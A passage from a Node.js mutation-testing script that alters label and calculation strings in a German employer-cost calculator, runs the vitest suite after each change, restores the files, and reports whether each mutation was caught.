      'below, for U1. Two different entitlements sharing two words on one page, in one locale only.',
    file: COPY,
    from: "en: 'Reduced health rate (no Krankengeld entitlement, § 243 SGB V)',",
    to: "en: 'Reduced health rate (no sick-pay entitlement)',",
  },
]

const TESTS = ['lib/calculators/de-employer-cost', 'lib/calculators/jurisdiction-boundary.test.ts']

function suiteFails() {
  try {
    execFileSync('npx', ['vitest', 'run', ...TESTS], { cwd: ROOT, stdio: 'pipe' })
    return null
  } catch (err) {
    const out = `${err.stdout ?? ''}${err.stderr ?? ''}`
    const m = out.match(/^ FAIL .*$/m)
    return m ? m[0].trim() : 'suite failed'
  }
}

function restoreAll() {
  for (const [f, src] of ORIGINAL) fs.writeFileSync(abs(f), src)
}

let survived = 0
let notApplied = 0

process.on('exit', restoreAll)

console.log('German employer-cost mutation gate\n')
try {
  // Sanity: the suite must pass before anything is mutated, or every result
  // below is meaningless.
  const baseline = suiteFails()
  if (baseline) {
    console.error(`  ✗ the suite already fails before any mutation: ${baseline}`)
    process.exitCode = 1
    throw new Error('baseline')
  }
  console.log('  · baseline suite passes\n')

  for (const m of MUTATIONS) {
    const src = ORIGINAL.get(m.file)
    if (!src.includes(m.from)) {
      console.log(`  ✗ ${m.name}\n      could not apply — the anchor is no longer in ${m.file}`)
      notApplied++
      continue
    }
    fs.writeFileSync(abs(m.file), src.replace(m.from, m.to))
    const failure = suiteFails()
    fs.writeFileSync(abs(m.file), src)

    if (failure) {
      console.log(`  ✓ ${m.name}\n      caught by ${failure.replace(/^ ?FAIL +/, '')}`)
    } else {
      console.log(`  ✗ ${m.name}\n      SURVIVED — ${m.why}`)
      survived++
    }
  }
} finally {
  restoreAll()
  const drifted = TOUCHED.filter((f) => read(f) !== ORIGINAL.get(f))
  if (drifted.length) {
    console.error(`\n  ✗ files left mutated: ${drifted.join(', ')}`)
    process.exitCode = 1
  }
}

console.log(
  `\n${MUTATIONS.length} mutations · ${MUTATIONS.length - survived - notApplied} caught · ` +
    `${survived} survived · ${notApplied} not applied`,
)
if (survived || notApplied) {
  console.log('\nMutation gate: FAIL')
  process.exitCode = 1
} else {
  console.log('\nMutation gate: PASS')
}
